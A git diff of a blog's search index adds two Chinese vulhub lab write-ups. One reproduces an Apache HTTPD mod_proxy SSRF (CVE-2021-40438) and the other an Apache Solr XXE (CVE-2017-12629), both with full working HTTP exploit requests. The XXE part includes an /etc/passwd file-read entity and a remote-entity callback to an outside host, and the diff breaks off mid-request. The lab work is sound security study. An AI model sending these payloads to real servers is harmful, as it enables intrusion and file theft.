@@ -1833,36 +1833,6 @@
       </tags>
   </entry>
   <entry>
-    <title>图床图片测试</title>
-    <url>/2023/10/29/%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<p><img src="https://s2.loli.net/2023/10/29/vjYu7sqMi8dgQbK.jpg" alt="SM.MS"></p>
-<p><img src="https://s2.loli.net/2023/10/29/Hns3KL4TP2qQm9f.jpg" alt="SM.MS"></p>
-<p><img src="https://s3.uuu.ovh/imgs/2023/11/02/e9d94fc61d21d30a.jpg" alt="ImgUrl"></p>
-<p><img src="https://img.gaifagafin.top/202311041048278.jpg" alt="CloudFlare R2"></p>
-<p><img src="https://images.gaifagafin.top/202311051019789.jpg" alt="cloudflare R2"></p>
-<p><img src="https://images.gaifagafin.top/202311051020956.png" alt="cloudflare R2"></p>
-<p><img src="https://img.gaifagafin.top/wallhaven-3z2k6y.jpg" alt="backbazeb2 8.8MB"></p>
-<p><img src="https://img.gaifagafin.top/wallhaven-72eq5o.jpg" alt="backbazeb2 7.7MB"></p>
-<p><img src="https://img.gaifagafin.top/gaifagafin.jpg" alt="backbazeb2 189KB"></p>
-<p>视频插入测试，代码为：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> </span><br><span class="hljs-tag"><span class="hljs-attr">src</span>=<span class="hljs-string">&quot;//player.bilibili.com/player.html?aid=534928147&amp;bvid=BV1dM41197wb&amp;cid=1307621987&amp;p=1&quot;</span>  <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> </span><br><span class="hljs-tag"><span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">framespacing</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">allowfullscreen</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position: absolute; width: 100%; </span></span><br><span class="hljs-string"><span class="hljs-tag">height: 100%; left: 0; top: 0;&quot;</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-
-
-<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe 
-src="//player.bilibili.com/player.html?aid=534928147&bvid=BV1dM41197wb&cid=1307621987&p=1"  scrolling="no" border="0" 
-frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; 
-height: 100%; left: 0; top: 0;"> </iframe></div>
-
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>picture</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>攻防世界-Web_python_template_injection</title>
     <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/</url>
     <content><![CDATA[<p>第一次做模板注入的题目，参考H师傅的writeup <a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
@@ -4755,6 +4725,214 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
       </categories>
       <tags>
         <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache HTTPD 2.4.48 mod_proxy SSRF漏洞(CVE-2021-40438)</title>
+    <url>/2023/11/22/Apache-HTTPD-2-4-48-mod-proxy-SSRF%E6%BC%8F%E6%B4%9E-CVE-2021-40438/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Apache HTTPD 2.4.48 mod_proxy SSRF漏洞（CVE-2021-40438）</p>
+<ol>
+<li>复现环境中的SSRF漏洞，截图证明</li>
+<li>尝试利用SSRF漏洞，访问重庆邮电大学官网（<a href="http://www.cqupt.edu.cn/%EF%BC%89">http://www.cqupt.edu.cn/）</a></li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入漏洞目录执行如下命令编译及运行一个Apache HTTP Server 2.4.43服务器：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker compose up -d<br></code></pre></td></tr></table></figure>
+
+<p>服务器启动后，访问8080端口可以看到一个Apache Tomcat的示例页面，此时Apache HTTP Server是以中间反代服务器的身份，运行在客户端（用户）和后端服务器（Tomcat）之间，Apache和Tomcat通过AJP协议进行通信。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>发送如下数据包，可见我们已经成功请求到<code>http://example.com</code>的页面并返回：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.37.128:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>www.google.com<br><br></code></pre></td></tr></table></figure>
+
+<img src="https://images.gaifagafin.top/202311222300967.png" alt="返回页面" style="zoom:80%;" />
+
+<h1 id="访问重邮官网"><a href="#访问重邮官网" class="headerlink" title="访问重邮官网"></a>访问重邮官网</h1><p>只需要将上面payload的example的url改成重邮的官网，构造http请求：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://www.cqupt.edu.cn/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.37.128:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>www.google.com<br><br><br></code></pre></td></tr></table></figure>
+
+<p>发送请求，成功访问重邮官网</p>
+<img src="https://images.gaifagafin.top/202311222300054.png" style="zoom:80%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache solr XXE漏洞(CVE-2017-12629)</title>
+    <url>/2023/11/22/Apache-solr-XXE%E6%BC%8F%E6%B4%9E(CVE-2017-12629)/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Apache solr XXE漏洞(CVE-2017-12629)</p>
+<ol>
+<li>复现环境中的XXE漏洞，截图证明</li>
+<li>利用XXE漏洞发送HTTP请求，在VPS服务器接收请求，或收到DNS记录。（SSRF利用）</li>
+<li>利用XXE漏洞读取本地的 &#x2F;etc&#x2F;passwd文件。（文件读取利用）</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入漏洞文件目录下，运行漏洞环境：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">docker compose up -d<br></code></pre></td></tr></table></figure>
+
+<p>命令执行成功后，需要等待一会，之后访问<code>http://your-ip:8983/</code>即可查看到Apache solr的管理页面，无需登录。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h2><p>一般情况下，有些网站会支持XML-RPC（XML Remote Procedure Call），用户提交数据格式如下：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>aaa.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br>&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;student&gt;<br>&lt;useername&gt;xxx&lt;/username&gt;<br>&lt;password&gt;yyy&lt;/password&gt;<br>&lt;address&gt;zzz&lt;/address&gt;<br>&lt;/student&gt;<br></code></pre></td></tr></table></figure>
+
+<p>攻击者可通过插入DTD标签来读取文件：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>aaa.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br>&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE ANY [<br>&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>]&gt;<br>&lt;student&gt;<br>&lt;useername&gt;xxx&lt;/username&gt;<br>&lt;password&gt;yyy&lt;/password&gt;<br>&lt;address&gt;zzz&lt;/address&gt;<br>&lt;/student&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="XXE漏洞复现"><a href="#XXE漏洞复现" class="headerlink" title="XXE漏洞复现"></a>XXE漏洞复现</h2><p>构造payload：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.137.1:6666&quot;</span>&gt;</span>%remote;]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">root</span>/&gt;</span>&amp;wt=xml&amp;defType=xmlparser<br></code></pre></td></tr></table></figure>
+
+<p>将其进行<strong>url编码</strong>：</p>
+<p><img src="https://images.gaifagafin.top/202311222302622.png"></p>
+<p>发送的http包</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/solr/demo/select?q=&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//192.168.137.1%3a6666&quot;&gt;%25remote%3b]&gt;&lt;root/&gt;&amp;wt=xml&amp;defType=xmlparser</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.37.128:8983<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: 